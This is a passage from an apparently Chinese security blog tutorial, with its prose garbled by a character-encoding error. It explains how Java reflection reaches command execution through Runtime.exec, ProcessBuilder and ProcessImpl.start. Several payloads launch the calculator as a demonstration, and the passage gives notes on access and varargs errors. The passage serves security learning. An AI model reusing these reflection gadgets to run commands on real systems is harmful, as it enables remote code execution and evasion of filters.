java.base/jdk.internal.reflect.Reflection.newIllegalAccessException(Reflection.java:361) at java.base/jdk.internal.reflect.Reflection.ensureMemberAccess(Reflection.java:99) at java.base/java.lang.Class.newInstance(Class.java:579) at Text.main(Text.java:5) åŸå› å°±æ˜¯Runtimeç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œå¯¼è‡´è¿™æ ·ctf.newInstance()ç›´æ¥è°ƒç”¨æ˜¯é”™è¯¯çš„ã€‚\nå¯ä»¥çœ‹ä¸€ä¸‹æºç \nå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªgetRuntime()æ–¹æ³•å¯ä»¥è·å–åˆ°å¯¹è±¡ï¼Œè¿™ç§è®¾è®¡å°±æ˜¯â€œå•ä¾‹æ¨¡å¼â€ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªé™æ€æ–¹æ³•æ¥è·å–å¯¹è±¡ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬åªèƒ½é€šè¿‡Runtime.getRuntime()æ¥è·å–åˆ°Runtimeå¯¹è±¡ã€‚\nè¿™é‡ŒRuntime.getRuntime()æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨invokeæ‰§è¡Œæ–¹æ³•æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ä¼ å…¥ä¸€ä¸ªRuntimeç±»,æ‰€ä»¥å¯ä»¥å°†ä»£ç æ”¹æˆå¦‚ä¸‹æ¥æ‰§è¡Œï¼š\n1 2 3 4 5 6 7 8 9 10 11 package java_foundation; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception{ Class clazz = Runtime.class; clazz.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class).invoke(clazz.getDeclaredMethod(\u0026#34;getRuntime\u0026#34;).invoke(null),\u0026#34;calc\u0026#34;); } } //æˆåŠŸå¼¹å‡ºè®¡ç®—æœº è¿˜å¯ä»¥é€šè¿‡setAccessible(true)è·å¾—è®¿é—®æƒé™ï¼Œå…¨åå°„è°ƒç”¨çš„ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 import java.lang.reflect.*; public class Text{ public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor constructor1 = ctf.getDeclaredConstructor(); constructor1.setAccessible(true); Object o = constructor1.newInstance(); Method method1 = ctf.getMethod(\u0026#34;getRuntime\u0026#34;); Object x = method1.invoke(o); Method method2 = ctf.getMethod(\u0026#34;exec\u0026#34;,String.class); method2.invoke(x,\u0026#34;calc\u0026#34;); } } æœ€åè™½ç„¶å¼¹å‡ºè­¦å‘Šä½†æ˜¯æˆåŠŸå¼¹å‡ºè®¡ç®—æœº\n1 2 3 4 5 WARNING: An illegal reflective access operation has occurred WARNING: Illegal reflective access by Text (file:/D:/java_text/java-1/out/production/java-1/) to constructor java.lang.Runtime() WARNING: Please consider reporting this to the maintainers of Text WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations WARNING: All illegal access operations will be denied in a future release å…¶å®ç›´æ¥å¦‚ä¸‹åˆ©ç”¨å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package java_foundation; import java.lang.Class; import java.lang.reflect.Constructor; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;).getDeclaredConstructor(); constructor.setAccessible(true); Runtime rt = (Runtime)constructor.newInstance(); rt.exec(\u0026#34;calc\u0026#34;); } } ä½†æ˜¯ä¸Šé¢çš„å…¨åˆ©ç”¨åå°„æ¥åˆ©ç”¨è¿˜æ˜¯éœ€è¦å­¦ä¹ ä¸€ä¸‹ã€‚\nå…¶ä»–ç±»ä¸æ–¹æ³•åˆ©ç”¨ ç°åœ¨ç›´æ¥ä½¿ç”¨Runtime.getRuntime().exec(cmd)çš„è°ƒç”¨å…¶å®å·²ç»ä¸å¤ªå¥½æ‰¾äº†ï¼Œåœ¨è¿™é‡Œçœ‹åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œä¹Ÿæ˜¯æ‹“å±•äº†æˆ‘çš„æ€è·¯ï¼Œè¿™é‡Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡è·Ÿè¿›Runtiemç±»çš„exec()æ–¹æ³•çš„åº•å±‚è°ƒç”¨è¿‡ç¨‹æ¥å®ŒæˆRCEåŠŸèƒ½çš„å®ç°ã€‚\nç°åœ¨è¿˜æ˜¯æ¥è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹è¿™é‡Œçš„åº•å±‚å®ç°ä»¥åŠè‡ªå·±æ„å»ºä»£ç ã€‚\nåŸºæœ¬æµ‹è¯•ç±»ï¼š\nMain.javaï¼š\n1 2 3 4 5 6 7 8 9 10 package java_foundation; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception{ Runtime rt = Runtime.getRuntime(); rt.exec(\u0026#34;calc\u0026#34;); } } è¿è¡ŒæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nè°ƒè¯•è¿‡ç¨‹ è·Ÿè¿›ä»£ç ä¸­çš„exec()æ–¹æ³•ï¼Œç„¶åæ‰“æ–­ç‚¹ï¼š\nå¼€å§‹è°ƒè¯•ï¼š\nç„¶åè°ƒç”¨äº†é‡è½½çš„exec()æ–¹æ³•ï¼š\nåˆè°ƒç”¨äº†é‡è½½çš„exec()æ–¹æ³•ï¼š\nç„¶åè¿™é‡Œå°±å®ä¾‹åŒ–äº†ä¸€ä¸ªæ–¹æ³•æ¥æ‰§è¡Œè¿™ä¸ªè¿‡ç¨‹ã€‚åœ¨è¿™é‡Œæˆ‘è°ƒè¯•æ—¶å‘ç°å…¶å®è¿™é‡Œç›´æ¥returnè¿™ä¸ªProcessBuilderç±»åç›´æ¥å°±å¼¹å‡ºäº†è®¡ç®—æœºï¼Œè¯´æ˜å…¶å®è¿™é‡Œå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ã€‚æ‰€ä»¥è¿™é‡Œå°±æœ‰ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œç›´æ¥æ ¹æ®è¿™é‡Œçš„ç‚¹æ¥æ„é€ ä¸€ä¸ªç®€å•çš„payloadï¼Œç¬¬ä¸€æ„é€ ç‚¹äº†ï¼Œä½†æ˜¯åé¢å†è¯´æ˜ã€‚è¿™é‡Œç»§ç»­è·Ÿä»£ç ï¼š\nç„¶åå°±æ˜¯å®ä¾‹åŒ–äº†ProcessBuilderç±»ï¼š\nå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªcommandæ˜¯ä¸€ä¸ªæ•°ç»„ç±»å‹çš„å€¼ï¼Œå¹¶ä¸”è¿™é‡Œaddè¿‡åçš„å€¼ä¹Ÿå¯ä»¥è°ƒè¯•çœ‹ä¸€ä¸‹ï¼š\nã€‚ç»§ç»­å¾€åé¢èµ°ï¼Œè°ƒç”¨äº†environment()æ–¹æ³•ï¼š\nè¿™é‡Œå…¶å®å°±æ˜¯ç›´æ¥è¿”å›çš„å‰é¢çš„ProcessBuilderç±»å®ä¾‹ï¼Œæ²¡æœ‰å…¶ä»–æ“ä½œã€‚\nç„¶åè°ƒç”¨äº†directory()æ–¹æ³•ï¼š\nä¸€ä¸ªç®€å•çš„èµ‹å€¼æ“ä½œï¼Œç„¶åè¿”å›äº†ProcessBuilderç±»å®ä¾‹ã€‚\næœ€åè°ƒç”¨äº†start()æ–¹æ³•ï¼š\nä»£ç é€»è¾‘ç®€å•è·Ÿä¸€ä¸‹ï¼Œè¿˜æ˜¯èƒ½çœ‹æ‡‚ï¼Œä¸»è¦è°ƒç”¨çš„å°±æ˜¯ä¸‹é¢çš„ProcessImplç±»çš„start()æ–¹æ³•ï¼Œå¹¶ä¸”è¿™é‡Œåœ¨æ‰§è¡Œè¿™ä¸ªæ–¹æ³•åå¼¹å‡ºè®¡ç®—æœºï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯ç¬¬äºŒä¸ªæ„é€ ç‚¹ã€‚ç°åœ¨è¿˜æ˜¯ä¸è°ˆï¼Œåé¢å†å…·ä½“åˆ†æã€‚\nåœ¨è¿™é‡Œå°±æ˜¯è°ƒç”¨äº†ProcessImplç±»çš„start()æ–¹æ³•ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹ProcessImplç±»çš„start()æ–¹æ³•çš„å®šä¹‰ï¼š\nå°±æ˜¯è¿™ä¸ªstaticä¿®é¥°ç¬¦ï¼Œè®©è¿™ä¸ªstart()æ–¹æ³•å¯ä»¥ç›´æ¥è¢«è°ƒç”¨ã€‚é‚£ä¹ˆç°åœ¨å†ç»§ç»­è·Ÿè¿›è¿™é‡Œçš„start()æ–¹æ³•ï¼Œå‚æ•°ä¼ é€’æƒ…å†µï¼š\nç®€å•è·Ÿäº†ä¸€ä¸‹ï¼Œå…¶å®æœ€åè°ƒç”¨çš„è¿˜æ˜¯å¦‚ä¸‹ä»£ç ï¼š\nè°ƒè¯•è¿‡åå‘ç°è¿™é‡Œä¹Ÿæ˜¯ç›´æ¥å®ä¾‹åŒ–è¿™ä¸ªè¿‡ç¨‹ç„¶åå¼¹å‡ºè®¡ç®—æœºï¼Œè¿™é‡Œçš„å‚æ•°ä¼ é€’ï¼š\næ‰€ä»¥è¿™é‡Œåˆæ˜¯ç¬¬ä¸‰æ„é€ æ–¹æ³•ã€‚ï¼ˆæ„Ÿè§‰å…¶å®è¿™é‡Œéƒ½æ˜¯ä¸€å±‚å¥—ä¸€å±‚ï¼Œä¸»è¦æ˜¯å‚æ•°çš„ä¼ é€’å§ï¼‰ã€‚\nå†ç»§ç»­è·Ÿè¿›ï¼Œç°åœ¨æ¥åˆ°äº†ProcessImplç±»çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼š\næ‰€ä»¥ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªifè¯­å¥ï¼Œå°±æ˜¯å°†allowAmbiguousCommandsè®¾ç½®ä¸ºtrueï¼Œä»¥åŠvalueæœ€ç»ˆå€¼ä¸ºnullï¼Œç„¶åå°±é€€å‡ºç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼Œéšåæ­£å¥½å°±è¿›å…¥äº†ç¬¬äºŒä¸ªifæ¡ä»¶ï¼Œè¿™é‡Œå°±ä¸ç»†è·Ÿç¬¬äºŒä¸ªifæ¡ä»¶äº†ï¼Œæœ€åé€€å‡ºè¿™ä¸ªifæ¡ä»¶ï¼Œå°†è°ƒç”¨create()æ–¹æ³•ï¼š\nå½“è·³è¿‡è¿™ä¸ªcreate()æ–¹æ³•å°±å¼¹å‡ºè®¡ç®—æœºï¼Œè¯´æ˜è¿™é‡Œä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œç¬¬å››æ„é€ ç‚¹ã€‚é‚£ä¹ˆç°åœ¨ç»§ç»­è·Ÿè¿›è¿™ä¸ªcreate()æ–¹æ³•ï¼Œä½†æ˜¯ä¸€ç›´è·Ÿä¸è¿›å»ï¼Œalt+shift+F7å¼ºåˆ¶æ­¥å…¥ä¹Ÿè¿›ä¸äº†ã€‚ç®€å•è·Ÿè¿›æ˜¯å¯¹åº”çš„å¦‚ä¸‹æ–¹æ³•ï¼š\nä¸Šé¢ä¹Ÿæ˜¯æœ‰æ–¹æ³•è¯´æ˜çš„ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ä¼šä½¿ç”¨win32å‡½æ•°æ¥åˆ›å»ºè¿›ç¨‹ï¼Œè¿™é‡Œå°±æœ‰ç‚¹å¤ªåº•å±‚äº†ã€‚å¹¶ç”±ç”±äºæ“ä½œç³»ç»Ÿçš„ä¸åŒï¼Œè¿™åˆ†æå‡ºæ¥çš„ä¸»è¦æ˜¯windowsç³»ç»Ÿä¸‹ï¼Œå¯¹äºlinuxç³»ç»Ÿä¸‹çš„åˆ©ç”¨ä¹Ÿå°±ä¼šæœ‰ä¸åŒï¼Œä¸å†å¾€ä¸‹è·Ÿäº†ã€‚\næ€»ç»“ä¸€ä¸‹å‰é¢çš„å‡ ä¸ªæ„é€ ç‚¹ï¼š\nnew ProcessBuilder(cmdarray).environment(envp).directory(dir).start() ProcessImplç±»çš„start()æ–¹æ³•ã€‚ å¤§æ¦‚å°±æ˜¯è¿™ä¸¤ä¸ªï¼Œå› ä¸ºlinuxå’Œwindowsä¸¤ä¸ªæ“ä½œç³»ç»Ÿçš„ä¸åŒï¼Œåœ¨ç¬¬ä¸‰ä¸ªæ„é€ ç‚¹å°±å¼€å§‹æœ‰ä¸åŒä»£ç äº†ï¼Œå¦‚æœæ˜¯æ‰“linuxç¯å¢ƒä¹Ÿè®¸è¿˜æœ‰æ›´å¤šçš„paylaodï¼Œè¿™ä¸ªå°±åˆ°æ—¶å€™å†å…·ä½“è·Ÿå§ã€‚è¿™é‡Œå°±åªè¯´æ˜è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œå…·ä½“åŒºåˆ«å¯ä»¥çœ‹ä¸€ä¸‹å‚è€ƒæ–‡ç« ã€‚\nåˆ©ç”¨ProcessBuilder å¯¹åº”ä»£ç ï¼š\njava.lang.ProcessBuilderç±»ç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹ï¼Œ è¿˜æ˜¯è°ƒè¯•ä»£ç çœ‹éœ€è¦å“ªäº›å‚æ•°ï¼š\né¦–å…ˆå°±æ˜¯æ–°å»ºäº†ProcessBuilderç±»å®ä¾‹ï¼Œé‡ç‚¹æ˜¯æ³¨æ„å‚æ•°ç±»å‹ä»¥åŠå‚æ•°çš„ä¼ é€’ï¼Œå…ˆæ˜¯å®ä¾‹åŒ–äº†ProcessBuilderç±»ï¼š\nç„¶åå°†è¿™ä¸ªcommandå˜é‡è®¾ç½®ä¸ºäº†ä¸€ä¸ªæ•°ç»„ç±»å‹çš„å˜é‡ã€‚\nç„¶åè°ƒç”¨äº†environment()æ–¹æ³•ï¼Œä½†æ˜¯æ²¡å•¥ç”¨ï¼Œå…¶å®å°±æ˜¯å°†ProcessBuilderç±»çš„environmentå˜é‡è®¾ç½®ä¸ºnullã€‚\nç„¶åè°ƒç”¨äº†directory()æ–¹æ³•ï¼ŒåŒæ ·å…¶å®å°±æ˜¯ä¸€ä¸ªå°†ProcessBuilderç±»çš„directoryå˜é‡è®¾ç½®ä¸ºnullã€‚\næœ€åè°ƒç”¨äº†start()æ–¹æ³•å®Œæˆå‘½ä»¤çš„æ‰§è¡Œã€‚\nä½†æ˜¯å…¶å®å¯¹äºä¸­é—´ä¸¤ä¸ªå˜é‡çš„è®¾ç½®ï¼Œå…¶å®åœ¨ProcessBuilderç±»åˆå§‹åŒ–åå°±å·²ç»ç¬¦åˆæ¡ä»¶äº†ï¼š\næ‰€ä»¥å…¶å®åªç”¨è·å–æ„é€ å™¨å’Œstart()æ–¹æ³•å³å¯ã€‚ä½†è¿™é‡Œè¦è¯´æ˜ä¸€ä¸ªç‚¹ï¼šJavaä¸­çš„å¯å˜é•¿å‚æ•°ï¼Œå½“å®šä¹‰å‡½æ•°çš„æ—¶å€™ä¸ç¡®å®šå‚æ•°æ•°é‡çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨...è¿™æ ·çš„è¯­æ³•æ¥è¡¨ç¤ºâ€è¿™ä¸ªå‡½æ•°çš„å‚æ•°ä¸ªæ•°æ˜¯å¯å˜çš„â€œã€‚åŒæ—¶å¯¹äºå¯å˜é•¿å‚æ•°ï¼ŒJavaåœ¨ç¼–è¯‘æ—¶ä¼šç¼–è¯‘æˆä¸€ä¸ªæ•°ç»„ï¼Œæ‰€æœ‰è¯´ä¸‹é¢è¿™ä¸¤ç§å†™æ³•åœ¨åº•å±‚å…¶å®æ˜¯ç­‰ä»·çš„ï¼š\n1 2 public void hello(String[] names){} public void hello(String...name){} å¯¹äºåå°„æ¥è¯´ï¼Œå¦‚æœè¦è·å–çš„ç›®æ ‡å‡½æ•°é‡ŒåŒ…å«å¯å˜é•¿å‚æ•°ï¼Œå…¶å®æˆ‘ä»¬è®¤ä¸ºå®ƒæ˜¯æ•°ç»„å°±è¡Œäº†ã€‚\né‚£ä¹ˆå¯ä»¥å¦‚ä¸‹æ„é€ paylaodï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package java_foundation; import java.lang.reflect.Constructor; import java.lang.reflect.Method; public class MyTest { public static void main(String[] args) throws Exception{ String[] cmd = new String[]{\u0026#34;calc\u0026#34;}; String className = \u0026#34;java.lang.ProcessBuilder\u0026#34;; Class clazz = Class.forName(className); Constructor constructor = clazz.getDeclaredConstructor(String[].class); Method method = clazz.getDeclaredMethod(\u0026#34;start\u0026#34;,null); method.invoke(constructor.newInstance(cmd)); } } ä½†æ˜¯æŠ¥é”™ï¼š\n1 2 3 4 5 6 Exception in thread \u0026#34;main\u0026#34; java.lang.IllegalArgumentException: argument type mismatch at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:422) at java_foundation.MyTest.main(MyTest.java:13) ä¹Ÿç®—ç§¯ç´¯ç»éªŒäº†ï¼Œä¸€ç›´åœ¨çœ‹è¯­æ³•ï¼Œç»“æœé—®æŠ¥é”™ä¸€ä¸‹å°±è§£å†³äº†ï¼Œè¿™é‡Œçš„åŸºæœ¬çš„å¤§éƒ¨åˆ†è¯­æ³•æ˜¯æ²¡æœ‰é”™è¯¯çš„ï¼Œä¸»è¦è¿˜æ˜¯å¯å˜å‚æ•°çš„åŸå› ã€‚å³ProcessBuilderç±»çš„æ„é€ å‡½æ•°ï¼š\nè¿™é‡Œå°±ç›´æ¥ç»§æ‰¿ä¸€ä¸ªå›ºå®šçš„å§ï¼Œä¹Ÿå°±æ˜¯è¯´ã€‚æˆ‘åœ¨åå°„æ—¶è·å–äº†æ­£ç¡®çš„æ„é€ å‡½æ•°String[].classï¼Œä½†æ˜¯åœ¨å®ä¾‹åŒ–æ—¶æœ‰åŒºåˆ«ï¼Œä¸»è¦æ˜¯å› ä¸º å¯å˜å‚æ•° (varargs) å’Œ æ•°ç»„ç±»å‹ åœ¨ Java åå°„ä¸­çš„å¤„ç†æ–¹å¼ç¨å¾®ä¸åŒã€‚å°±æ˜¯åœ¨è°ƒç”¨newInstance()æ–¹æ³•æ—¶ï¼ŒJavaä¼šå°†å¯å˜å‚æ•°è§†ä¸ºä¸€ä¸ªObject[]ç±»å‹ï¼Œè€Œä¸æ˜¯ç›´æ¥çš„String[]ã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºObjectç±»å‹ã€‚æ‰€ä»¥æ­£ç¡®çš„åˆ©ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //åŸåˆ©ç”¨æ€è·¯ï¼šnew ProcessBuilder(new String[]{\u0026#34;calc\u0026#34;}).start(); package java_foundation; import java.lang.reflect.Constructor; import java.lang.reflect.Method; public class MyTest { public static void main(String[] args) throws Exception{ String[] cmd = new String[]{\u0026#34;calc\u0026#34;}; String className = \u0026#34;java.lang.ProcessBuilder\u0026#34;; Class clazz = Class.forName(className); Constructor constructor = clazz.getDeclaredConstructor(String[].class); Method method = clazz.getDeclaredMethod(\u0026#34;start\u0026#34;,null); method.invoke(constructor.newInstance((Object)cmd)); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œå¹¶ä¸”åªä½¿ç”¨åå°„çš„æ¡ä»¶ã€‚è¿˜å¯ä»¥å¦‚ä¸‹è¿›è¡Œè¯´æ˜ä¼ å‚ï¼š\næˆ‘ä»¬å°†å­—ç¬¦ä¸²æ•°ç»„çš„ç±»String[].classä¼ ç»™getConstructorå³å¯ï¼Œæ­¤æ—¶å°±è·å–åˆ°äº†å‚æ•°ä¸ºæ•°ç»„ç±»å‹çš„newInstance()ï¼Œåœ¨è°ƒç”¨newInstanceçš„æ—¶å€™ï¼Œå› ä¸ºæœ¬èº«æ¥æ”¶çš„æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼ˆå³ä¸€ä¸ªæ•°ç»„ï¼‰ï¼Œå¹¶ä¸”éœ€è¦æˆ‘ä»¬ä¼ ç»™ ProcessBuilderæ„é€ å™¨çš„å‚æ•°çš„æ˜¯ä¸€ä¸ªList\u0026lt;String\u0026gt;ç±»å‹ï¼ŒäºŒè€…å åŠ ä¸ºä¸€ä¸ªäºŒç»´æ•°ç»„,æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 import java.lang.reflect.*; public class Text{ public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); Constructor constructor1 = ctf.getConstructor(String[].class); Object o = constructor1.newInstance(new String[][]{{\u0026#34;calc\u0026#34;}}); Method method1 = ctf.getMethod(\u0026#34;start\u0026#34;); method1.invoke(o); } } /*ä¸­é—´ä»£ç ç²¾ç®€ï¼š Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ctf.getMethod(\u0026#34;start\u0026#34;).invoke(ctf.getConstructor(String[].class).newInstance(new String[][]{{\u0026#34;calc\u0026#34;}})); è¯´ä¸€ç‚¹ç‚¹ä»£ç ï¼š\nå¯¹äºnew String[][]{{\u0026quot;calc\u0026quot;}}ï¼šè¿™é‡Œä½¿ç”¨ new å…³é”®å­—åˆ›å»ºå¹¶åˆå§‹åŒ–ä¸€ä¸ªäºŒç»´å­—ç¬¦ä¸²æ•°ç»„ï¼Œç¡®ä¿å‚æ•°ç±»å‹æ­£ç¡®åŒ¹é… ã€‚ ç„¶ååœ¨å…¶ä»–æ–‡ç« ä¸­çœ‹åˆ°äº†å¦å¤–ä¸€ä¸ªæœ‰æ„æ€çš„paylaodï¼Œç›´æ¥çœ‹å§ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.List; import java.util.Arrays; public class MyTest { public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); Constructor constructor1 = ctf.getConstructor(List.class); Object o = constructor1.newInstance(Arrays.asList(\u0026#34;calc\u0026#34;)); Method method1 = ctf.getMethod(\u0026#34;start\u0026#34;); method1.invoke(o); } } /*æˆåŠŸå¼¹è®¡ç®—æœº ä¸­é—´ä»£ç ç²¾ç‚¼ä¸€ä¸‹å°±æ˜¯ï¼ˆè¿™æ ·å°±ä¸ç”¨å¯¼langä¸‹çš„åŒ…ï¼‰ï¼š Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ctf.getMethod(\u0026#34;start\u0026#34;).invoke(ctf.getConstructor(List.class).newInstance(Arrays.asList(\u0026#34;calc\u0026#34;))); è¿™é‡Œä¸»è¦å°±æ˜¯åˆ©ç”¨çš„å¦å¤–ä¸€ä¸ªæ„é€ å‡½æ•°æ¥æ„é€ çš„payloadï¼š\nå› ä¸ºè¿™ä¸¤ä¸ªæ„é€ å‡½æ•°å…¶å®æœ€åéƒ½æ˜¯ç›´æ¥ä½œç”¨ä¸å®ƒçš„commandå˜é‡ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦ä¼ å…¥çš„å‘½ä»¤ï¼Œè¿™é‡ŒåŒæ ·å¯ä»¥é€šè¿‡è·å–ç›¸åº”çš„æ„é€ å‡½æ•°å¹¶ä¼ å…¥ç›¸åº”çš„å€¼æ¥æ‰§è¡Œå‘½ä»¤ã€‚å…·ä½“å°±çœ‹ä¸Šé¢çš„ä»£ç äº†ï¼Œä¸å¤šèµ˜è¿°ã€‚\nProcessImpl#start() å¯¹åº”ä»£ç ï¼š\nè¿™é‡Œå…¶å®å°±æ˜¯å¯¹åº”çš„ProcessBuilderç±»è°ƒç”¨çš„start()æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯å‰ä¸€ä¸ªè°ƒç”¨æ–¹æ³•çš„æ›´æ·±ä¸€å±‚ä½†æ˜¯è¿™é‡Œå¯¹åº”çš„ç±»æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ã€‚\nå¯¹äºè¿™é‡Œç›´æ¥è°ƒç”¨çš„ProcessImplç±»çš„start()æ–¹æ³•ï¼Œè¿™é‡Œæ˜¯å› ä¸ºè¿™ä¸ªç±»çš„start()æ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼ŒåŒæ ·ç›´æ¥æ‰“å°±è¡Œäº†ï¼Œå¯¹åº”çš„å‚æ•°ä¼ é€’æƒ…å†µï¼š\næ‰€ä»¥ç›´æ¥æ‰“å°±è¡Œï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 package java_foundation; import java.lang.reflect.Method; import java.util.Map; public class MyTest { public static void main(String[] args) throws Exception{ String name = \u0026#34;java.lang.ProcessImpl\u0026#34;; String[] cmd = {\u0026#34;calc\u0026#34;}; Method method = Class.forName(name).getDeclaredMethod(\u0026#34;start\u0026#34;, String[].class, Map.class,String.class, ProcessBuilder.Redirect[].class, boolean.class); method.invoke(null,cmd,null,null,null,false); } } æŠ¥é”™ï¼š\n1 2 3 Exception in thread \u0026#34;main\u0026#34; java.lang.NoSuchMethodException: java.lang.ProcessImpl.start([Ljava.lang.String;, java.util.Map, java.lang.String, java.lang.ProcessBuilder$Redirect, boolean) at java.lang.Class.getDeclaredMethod(Class.java:2130) at java_foundation.MyTest.main(MyTest.java:10) è™½ç„¶è¿™ä¸ªstart()æ–¹æ³•æ²¡æœ‰å®šä¹‰ä¸ºç§æœ‰ç±»å‹ï¼š\nä½†æ˜¯è¿™ä¸ªstart()æ–¹æ³•æ‰€å¤„çš„ProcessImplç±»æ˜¯finalç±»å‹çš„çš„ï¼Œå¹¶ä¸”éƒ½ä¸èƒ½ç›´æ¥importå¼•å…¥ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡setAccessible(true);æ¥è®©å…¶å¯ä»¥è®¿é—®ã€‚\næ‰€ä»¥æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package java_foundation; import java.lang.reflect.Method; import java.util.Map; public class MyTest { public static void main(String[] args) throws Exception{ String name = \u0026#34;java.lang.ProcessImpl\u0026#34;; String[] cmd = {\u0026#34;calc\u0026#34;}; Method method = Class.forName(name).getDeclaredMethod(\u0026#34;start\u0026#34;, String[].class, Map.class,String.class, ProcessBuilder.Redirect[].class, boolean.class); method.setAccessible(true); method.invoke(null,cmd,null,null,null,false); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nè¿™é‡Œåªåˆ†æäº†é€šç”¨çš„ä¸¤ä¸ªpayloadï¼Œå¯¹äºlinuxç¯å¢ƒå½“ç„¶è¿˜å¯ä»¥æ‰“å…¶ä»–çš„æ–¹å¼ï¼Œå…·ä½“çœ‹å‚è€ƒæ–‡ç« ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://www.cnblogs.com/Nestar/p/17335689.html\nhttps://xz.aliyun.com/t/12446?time__1311=GqGxRQ0%3DitqiqGN4eeT4QwqWqrvD9BjiZaoD\n","date":"2024-06-19T21:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/","title":"Javaåå°„æœºåˆ¶"}]